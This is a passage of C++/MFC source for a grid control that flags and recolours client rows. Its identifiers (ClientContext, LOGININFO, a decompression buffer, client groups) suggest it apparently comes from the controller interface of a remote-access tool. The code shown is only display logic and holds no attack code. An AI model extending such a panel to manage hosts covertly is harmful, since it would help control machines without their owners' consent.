		POSITION pos = GetHeadPosition(pFindRoot);
		while (pos)
		{	
			CTreeItem *pChild = GetNextChild(pFindRoot, pos);
			CItemInfo* lp = GetData(pChild);
			if (pContext == (ClientContext *)lp->MyGetItemDate())
			{
				//				AfxMessageBox("0");
				//				LV_ITEM lvItem;		
				//				lvItem.mask = LVIF_TEXT | LVIF_INDENT | LVIF_PARAM;
				//				lp->GetItemClr()
				CString str, strTemp;// = "*";
				//				str.Format("%d", pChild->m_nIndex);
				//				AfxMessageBox(str);
				//				lp->GetItemCount();
				str = GetItemText(pChild->m_nIndex, 2);
				int n = str.Find("*");
				if (n == 0)
				{
					str = str.Right(str.GetLength() - 1);
				}
				strTemp = "*";
				strTemp += str;
				SetItemText(pChild->m_nIndex, 2, strTemp);
				lp->SetSubItemText(1, strTemp, RGB(255,77,255));
				for(int i = 0; i < GetNumCol() - 1; i++)
				{
					if (i == 1)
						continue;
					lp->SetSubItemText(i, lp->GetSubItem(i), RGB(255,77,255)); 
				}
				
				UpdateData(pChild, lp);
				// 				lp->SetSubItemText(1, "Test");
				// 				UpdateData(pChild, lp);
				// 				CItemInfo *pFind = CopyData(lp);
				// 				DeleteItemEx(pChild, )
				SetRedraw(0);
				InternaleUpdateTree();
				SetRedraw(1);
				InvalidateRect(NULL);
				UpdateWindow();
				break;
			}
		}
	}
	return 0;
}

LRESULT CMySuperGrid::OnFindNO(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	LOGININFO*	LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();
	CTreeItem *pFindRoot = GroupSearch(LoginInfo->szUpGroup, NULL);
	if (pFindRoot == NULL)
		return -1;
	int nCount = NumChildren(pFindRoot);
	if (nCount)
	{
		int nNum = 0;
		POSITION pos = GetHeadPosition(pFindRoot);
		while (pos)
		{	
			CTreeItem *pChild = GetNextChild(pFindRoot, pos);
			CItemInfo* lp = GetData(pChild);
			if (pContext == (ClientContext *)lp->MyGetItemDate())
			{
				CString str;
				str = GetItemText(pChild->m_nIndex, 2);
				int n = str.Find('*');
				if (n == 0)
					str = str.Right(str.GetLength() - 1);
				SetItemText(pChild->m_nIndex, 2, str);
				
				lp->SetSubItemText(1, str, RGB(193, 210, 240));
				//				lp->SetItemText(lp->GetItemText(), GetSysColor (COLOR_WINDOW));
				for(int i = 0; i < GetNumCol() - 1; i++)
				{
					if (i == 1)
						continue;
					lp->SetSubItemText(i, lp->GetSubItem(i), RGB(193, 210, 240)); 
				}
				UpdateData(pChild, lp);
				SetRedraw(0);
				InternaleUpdateTree();
				SetRedraw(1);
				InvalidateRect(NULL);
				UpdateWindow();
				break;
			}
		}
	}
	return 0;
}

void CMySuperGrid::OnCustomDraw(NMHDR* pNMHDR, LRESULT* pResult) 
{ 
	// Contains information specific to an NM_CUSTOMDRAW  
	// notification message sent by a list-view control. 
	// mean:draw each item.set txt color,bkcolor.... 
	NMLVCUSTOMDRAW* pLVCD = (NMLVCUSTOMDRAW*)(pNMHDR); 
	
	// Take the default processing unless we set this to something else below. 
	*pResult = CDRF_NEWFONT; 
	
	// First thing - check the draw stage. If it's the control's prepaint 
	// stage, then tell Windows we want messages for every item. 
	if ( pLVCD->nmcd.dwDrawStage==CDDS_PREPAINT) 
	{ 
		*pResult = CDRF_NOTIFYITEMDRAW; 
	} 
	// This is the notification message for an item.  We'll request 
	// notifications before each subitem's prepaint stage. 
	else if ( pLVCD->nmcd.dwDrawStage == CDDS_ITEMPREPAINT )  
	{
		COLORREF   m_crTextBk , m_clrText; 
		int nItem = static_cast<int> (pLVCD->nmcd.dwItemSpec); 
		
		//		CListCtrl &m_list = GetListCtrl(); 
		CString str1 = GetItemText(nItem ,2); 
		
		bool bDBImplFail = false;
		if (str1.Find("*") == 0)
		{
			m_crTextBk = RGB(255, 255, 255); 
			//			m_clrText  =  RGB(255, 0, 0) ; // 红色
			m_clrText  =  RGB(193, 210, 240) ; // 蓝色
		} 
		else 
		{
			m_crTextBk =  RGB(255, 255, 255);
			m_clrText  =  RGB(0, 0, 0);
		} 
		
		pLVCD->clrTextBk = m_crTextBk; 
		pLVCD->clrText = m_clrText; 
		
		*pResult = CDRF_DODEFAULT; 
	} 
} 


